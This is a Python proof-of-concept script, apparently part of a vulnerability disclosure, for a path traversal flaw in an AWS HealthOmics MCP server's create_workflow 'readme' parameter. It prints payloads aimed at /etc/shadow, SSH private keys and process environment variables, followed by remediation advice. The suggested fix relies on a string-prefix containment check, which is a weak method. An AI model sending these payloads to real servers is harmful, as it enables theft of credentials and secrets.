#!/usr/bin/env python3
"""
PoC: Path Traversal in AWS HealthOmics MCP Server (awslabs/mcp)

Finding: mcp-open-path-traversal (CWE-22)
File: src/aws-healthomics-mcp-server/awslabs/aws_healthomics_mcp_server/utils/validation_utils.py
Function: validate_readme_input() -> open(readme, 'r') without path sanitization
MCP Tool: create_workflow() in workflow_management.py

The 'readme' parameter accepts a "local .md file path" and passes it directly
to open() without validating against a base directory. This allows arbitrary
file read via path traversal.

Impact: An attacker can read any file on the filesystem accessible to the
MCP server process by passing a path like "../../../etc/passwd" as the readme.

CVSS 3.1 Estimate: 7.5 (HIGH) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
"""

import json


def generate_poc_payload(target_file="/etc/passwd"):
    """
    Generate a PoC payload for the create_workflow MCP tool.
    
    When the HealthOmics MCP server processes this, validate_readme_input()
    will detect it as a LOCAL_FILE (since it doesn't start with s3:// and
    doesn't look like markdown content), then call open(readme, 'r') which
    reads the target file.
    """
    # The path needs to look like a file path, not markdown content
    # The function detect_readme_input_type checks if it starts with '#'
    # or contains newlines (markdown), otherwise treats as file path
    payload = {
        "name": "test-workflow",
        "definition_source": "UEsDBBQAAAAIA...",  # minimal valid ZIP base64
        "readme": f"../../../..{target_file}",  # path traversal
    }
    return payload


def demonstrate_vulnerability():
    """Demonstrate the vulnerable code path."""
    print("=" * 70)
    print("PATH TRAVERSAL PoC — awslabs/mcp AWS HealthOmics MCP Server")
    print("=" * 70)
    print()
    print("Vulnerable function chain:")
    print("  1. create_workflow() MCP tool accepts 'readme' parameter")
    print("  2. validate_readme_input(ctx, readme) detects LOCAL_FILE type")
    print("  3. open(readme, 'r') called WITHOUT path sanitization")
    print()
    print("Proof-of-concept payloads:")
    
    targets = [
        "/etc/passwd",
        "/etc/shadow",
        "/home/user/.ssh/id_rsa",
        "/proc/self/environ",
        "/var/log/auth.log",
    ]
    
    for target in targets:
        payload = generate_poc_payload(target)
        print(f"\n  Target: {target}")
        print(f"  Payload: {json.dumps(payload['readme'])}")
    
    print()
    print("-" * 70)
    print("REMEDIATION:")
    print("-" * 70)
    print("  1. Use os.path.realpath() + os.path.commonpath() to validate")
    print("  2. Reject paths containing '..' or starting with '/'")
    print("  3. Maintain an allowlist of permitted base directories")
    print("  4. Use pathlib.Path.resolve() and check against allowed roots")
    print()
    print("Example fix:")
    print("""
    import os
    from pathlib import Path
    
    def safe_open_readme(readme_path, allowed_base="/allowed/path"):
        # Resolve to absolute path
        resolved = Path(readme_path).resolve()
        base = Path(allowed_base).resolve()
        
        # Ensure the resolved path is within allowed base
        if not str(resolved).startswith(str(base)):
            raise ValueError("Path traversal detected")
        
        # Additional check: reject paths with parent directory traversal
        if ".." in readme_path:
            raise ValueError("Parent directory traversal not allowed")
        
        return open(resolved, 'r', encoding='utf-8')
    """)


if __name__ == "__main__":
    demonstrate_vulnerability()
